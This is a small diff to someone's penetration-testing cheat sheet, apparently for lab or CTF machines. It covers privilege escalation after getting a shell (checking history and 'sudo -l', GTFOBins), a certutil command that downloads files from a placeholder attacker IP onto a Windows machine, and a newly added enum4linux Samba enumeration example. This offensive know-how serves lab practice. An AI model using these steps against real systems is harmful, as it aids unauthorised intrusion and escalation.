@@ -145,3 +145,4 @@ if you get a shell but don't have much auth and you want to scan machine to see 
 - if you log in as low prev user then type 'history' to check history and type 'sudo -l' to find if any command we can run with sudo with out password. search google 'gtfobins', it a website that tell you many prev escalations way.
 
 - use 'certutil -urlcache -f http://<ip>/<file>' to download files from web server (window machine)
+- scan samba using enum4linux: Enum4linux is a tool for enumerating information from Windows and Samba systems. ex: enum4linux -a 10.10.179.141 | tee enum4linux.log
